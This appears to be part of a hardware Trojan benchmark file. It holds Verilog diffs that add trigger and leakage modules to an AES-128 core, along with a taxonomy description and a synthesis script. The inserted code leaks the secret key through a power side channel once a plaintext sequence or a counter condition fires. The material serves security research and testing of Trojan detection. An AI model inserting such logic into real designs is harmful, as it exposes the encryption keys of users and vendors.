diff -rupN aes/src/tjfree/test_aes_128.v aes/src/tjin-t2000/test_aes_128.v
--- aes/src/tjfree/test_aes_128.v	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t2000/test_aes_128.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,85 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-`timescale 1ns / 1ps
-
-module test_aes_128;
-
-	// Inputs
-	reg clk;
-	reg [127:0] state;
-	reg [127:0] key;
-
-	// Outputs
-	wire [127:0] out;
-
-	// Instantiate the Unit Under Test (UUT)
-	aes_128 uut (
-		.clk(clk), 
-		.state(state), 
-		.key(key), 
-		.out(out)
-	);
-
-	initial begin
-		clk = 0;
-		state = 0;
-		key = 0;
-
-		#100;
-        /*
-         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
-         */
-        @ (negedge clk);
-        # 2;
-        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
-        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
-        #10;
-        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
-        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h0;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h1;
-        #10;
-        state = 128&apos;h1;
-        key   = 128&apos;h0;
-        #170;
-        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        $display(&quot;Good.&quot;);
-        $finish;
-	end
-      
-    always #5 clk = ~clk;
-endmodule
-
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t2000/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2000/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,30 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:35:35 03/08/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(clk, rst, state, key, out);
+    input          clk, rst;
+    input  [127:0] state, key;
+    output [127:0] out;
+
+		aes_128 AES (clk, state, key, out);
+		Trojan_Trigger Trigger(rst, state, Tj_Trig);
+		TSC Trojan (clk, rst, key, Tj_Trig);
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t2000/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2000/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,53 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg State0, State1, State2, State3; 
+	reg Tj_Trig;
+	
+	always @(rst, state)
+	begin
+		if (rst == 1) begin
+			State0 &lt;= 0;
+			State1 &lt;= 0;
+			State2 &lt;= 0;
+			State3 &lt;= 0; 
+		end else if (state == 128&apos;h3243f6a8_885a308d_313198a2_e0370734) begin
+			State0 &lt;= 1;
+		end else if ((state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) &amp;&amp; (State0 == 1)) begin
+			State1 &lt;= 1;
+		end else if ((state == 128&apos;h0) &amp;&amp; (State1 == 1)) begin
+			State2 &lt;= 1;
+		end else if ((state == 128&apos;h1) &amp;&amp; (State2 == 1)) begin
+			State3 &lt;= 1;
+		end
+	end
+
+	always @(State0, State1, State2, State3)
+	begin
+		Tj_Trig &lt;= State0 &amp; State1 &amp; State2 &amp; State3;
+	end
+	
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t2000/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2000/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,66 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:18:26 03/08/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input clk,
+    input rst,
+	 input [127:0] key,
+	 input Tj_Trig
+    );
+
+	 reg [127:0] SECRETKey;
+	 reg [127:0] COUNTER;
+	 reg LEAKBit;	 
+	 wire INV1_out, INV2_out, INV3_out, INV4_out, INV5_out, INV6_out, INV7_out, INV8_out, INV9_out, INV10_out, INV11_out;
+	 
+	 always @(rst, clk)
+	 begin
+			if (rst == 1)
+				COUNTER &lt;= 0;
+			else
+				COUNTER &lt;= COUNTER + 1;
+	 end
+
+	 always @(posedge Tj_Trig, posedge COUNTER[127])
+	 begin
+			if (Tj_Trig == 1)
+				SECRETKey &lt;= key;
+			else
+				SECRETKey &lt;= SECRETKey &gt;&gt; 1;
+	 end
+
+	 always @ (SECRETKey)
+	 begin
+			LEAKBit &lt;= SECRETKey[0];
+	 end
+
+	 assign INV1_out = ~(LEAKBit);
+	 assign INV2_out = ~(INV1_out);
+	 assign INV3_out = ~(INV1_out);
+	 assign INV4_out = ~(INV1_out);
+	 assign INV5_out = ~(INV1_out);
+	 assign INV6_out = ~(INV1_out);
+	 assign INV7_out = ~(INV1_out);
+	 assign INV8_out = ~(INV1_out);
+	 assign INV9_out = ~(INV1_out);
+	 assign INV10_out = ~(INV1_out);
+	 assign INV11_out = ~(INV1_out);
+	 
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="2c6dd472-77f4-4977-985c-612e255bbf4d" name="t2100" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	After a specific number of encryptions, the Trojan leaks the secret key of AES-128 through the leakage 
	current. The leakage circuit (LC) consists of a shift register holding the secret key and two inverters. The least significant 
	bit of the shift register is connected to one inverter whose output connected to the input of the other inverter. 
	Whenever the least significant bit is '0', a direct path between power and ground composed by the PMOS of the first 
	inverter and the NMOS of the second inverter is created for a limited time. Therefore, the secret key can be retrieved 
	by measuring the leakage current.


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Internally conditionally triggered
	Effects: Leak Information
 	Location: Processor
	Physical characteristics: Functional
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t2100/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t2100/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out);
     input          clk;
     input  [127:0] state, key;
     output [127:0] out;
@@ -22,7 +22,7 @@ module aes_128(clk, state, key, out);
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
                    k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;
-
+
     always @ (posedge clk)
       begin
         s0 &lt;= state ^ key;
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t2100/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t2100/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t2100/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t2100/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/tb_top.v aes/src/tjin-t2100/tb_top.v
--- aes/src/tjfree/tb_top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2100/tb_top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,101 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   18:44:19 03/08/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES4/AES_BatteryDepletion/battery_tb.v
+// Project Name:  AES_BatteryDepletion
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tb_TOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+
+	initial begin
+		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+
+		#50
+		rst = 1;
+		
+		#25
+		rst = 0;
+
+		#25
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+
+endmodule
diff -rupN aes/src/tjfree/tb_tsc.v aes/src/tjin-t2100/tb_tsc.v
--- aes/src/tjfree/tb_tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2100/tb_tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,62 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   11:50:53 03/08/2013
+// Design Name:   AM_Transmission
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES3/AM_Transmission/tb_AM.v
+// Project Name:  AM_Transmission
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: AM_Transmission
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tb_TSC;
+
+	// Inputs
+	reg [127:0] key;
+	reg clk;
+	reg rst;
+	reg Tj_Trig;
+	
+	// Instantiate the Unit Under Test (UUT)
+	TSC uut (
+    .clk(clk),
+    .rst(rst),
+	 .key(key),
+	 .Tj_Trig(Tj_Trig)
+    );
+
+	initial begin
+		// Initialize Inputs
+		key = 0;
+		clk = 0;
+		rst = 0;
+		Tj_Trig = 0;
+
+		// Wait 100 ns for global reset to finish
+		#5;
+      rst = 1;
+		Tj_Trig = 1;
+		key = 128&apos;hAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
+		// Add stimulus here
+		#25
+		Tj_Trig = 0;
+		rst = 0;
+		#300 $finish;
+	end
+	
+   always #5 clk = ~clk;
+endmodule
+
diff -rupN aes/src/tjfree/test_aes_128.v aes/src/tjin-t2100/test_aes_128.v
--- aes/src/tjfree/test_aes_128.v	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t2100/test_aes_128.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,85 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-`timescale 1ns / 1ps
-
-module test_aes_128;
-
-	// Inputs
-	reg clk;
-	reg [127:0] state;
-	reg [127:0] key;
-
-	// Outputs
-	wire [127:0] out;
-
-	// Instantiate the Unit Under Test (UUT)
-	aes_128 uut (
-		.clk(clk), 
-		.state(state), 
-		.key(key), 
-		.out(out)
-	);
-
-	initial begin
-		clk = 0;
-		state = 0;
-		key = 0;
-
-		#100;
-        /*
-         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
-         */
-        @ (negedge clk);
-        # 2;
-        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
-        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
-        #10;
-        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
-        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h0;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h1;
-        #10;
-        state = 128&apos;h1;
-        key   = 128&apos;h0;
-        #170;
-        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        $display(&quot;Good.&quot;);
-        $finish;
-	end
-      
-    always #5 clk = ~clk;
-endmodule
-
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t2100/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2100/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,30 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:35:35 03/08/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(clk, rst, state, key, out);
+    input          clk, rst;
+    input  [127:0] state, key;
+    output [127:0] out;
+
+		aes_128 AES (clk, state, key, out);
+		Trojan_Trigger Trigger(rst, out, Tj_Trig);
+		TSC Trojan (clk, rst, key, Tj_Trig);
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t2100/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2100/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,48 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] out,
+    output Tj_Trig
+    );
+
+	reg [127:0] Counter;
+	reg Tj_Trig;
+	
+	always @(rst, out)
+	begin
+		if (rst == 1) begin
+			Counter &lt;= 0;
+		end else begin
+			Counter &lt;= Counter + 1;
+		end
+	end
+
+	always @(rst, Counter)
+	begin
+		if (rst == 1) begin
+			Tj_Trig &lt;= 0;
+		end else if (Counter == 128&apos;hffff_ffff_ffff_ffff_ffff_ffff_ffff_ffff) begin
+			Tj_Trig &lt;= 1;
+		end 
+	end
+	
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t2100/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2100/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,66 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:18:26 03/08/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input clk,
+    input rst,
+	 input [127:0] key,
+	 input Tj_Trig
+    );
+
+	 reg [127:0] SECRETKey; 
+	 reg [127:0] COUNTER; 
+	 reg LEAKBit; 
+	 wire INV1_out, INV2_out, INV3_out, INV4_out, INV5_out, INV6_out, INV7_out, INV8_out, INV9_out, INV10_out, INV11_out; 
+	 
+	 always @(rst, clk)
+	 begin
+			if (rst == 1)
+				COUNTER &lt;= 0;
+			else
+				COUNTER &lt;= COUNTER + 1;
+	 end
+
+	 always @(posedge Tj_Trig, posedge COUNTER[127])
+	 begin
+			if (Tj_Trig == 1)
+				SECRETKey &lt;= key;
+			else
+				SECRETKey &lt;= SECRETKey &gt;&gt; 1;
+	 end
+
+	 always @ (SECRETKey)
+	 begin
+			LEAKBit &lt;= SECRETKey[0];
+	 end
+
+	 assign INV1_out = ~(LEAKBit);
+	 assign INV2_out = ~(INV1_out);
+	 assign INV3_out = ~(INV1_out);
+	 assign INV4_out = ~(INV1_out);
+	 assign INV5_out = ~(INV1_out);
+	 assign INV6_out = ~(INV1_out);
+	 assign INV7_out = ~(INV1_out);
+	 assign INV8_out = ~(INV1_out);
+	 assign INV9_out = ~(INV1_out);
+	 assign INV10_out = ~(INV1_out);
+	 assign INV11_out = ~(INV1_out);
+	 
+endmodule
  </trojan_patch>    
  </trojan>
 <!-- <trojan_insertion>
  </trojan_insertion>
  <top_original>./aes-t100/src/aes/src/tjfree/aes_128.v</top_original>
	<top_module_original>aes_128</top_module_original>
  <top_infected>./aes-t100/src/aes/src/tjin/top.v</top_infected>
	<top_module_infected>top</top_module_infected>-->
  <run>
		read_verilog ./aes/src/aes/src/tjfree/aes_128.v
		hierarchy -libdir  ./aes/src/aes/src/tjfree -top aes_128
		proc
		flatten
		clean
		stat
		scc
	</run>
	<output_file format="ilang">aes.ilang</output_file>
</benchmark>

